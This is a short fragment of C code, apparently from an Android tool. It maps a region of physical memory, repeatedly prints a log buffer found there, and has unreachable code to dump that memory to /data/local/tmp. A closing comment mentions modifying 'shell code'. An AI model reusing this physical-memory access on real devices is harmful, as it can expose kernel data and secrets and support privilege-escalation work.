	phy_mapd =  map_phymem(0x3FE01400,0x2000);//map_phymem(0x3FE79400,0x4000);

	char* log = (int)phy_mapd+0x400;
int len = 0,last_log;
	while(1){

		len = strlen(log);

		if(len != last_log)
			printf("%s",log);

		last_log = len;
		sleep(5);

	}

	//hexdump(phy_mapd,0x1000);

	if(phy_mapd!=-1)
		dump_phymem("/data/local/tmp/phydump",(int)phy_mapd,0x2000);
		return 0;


}

//I should modify the shell code
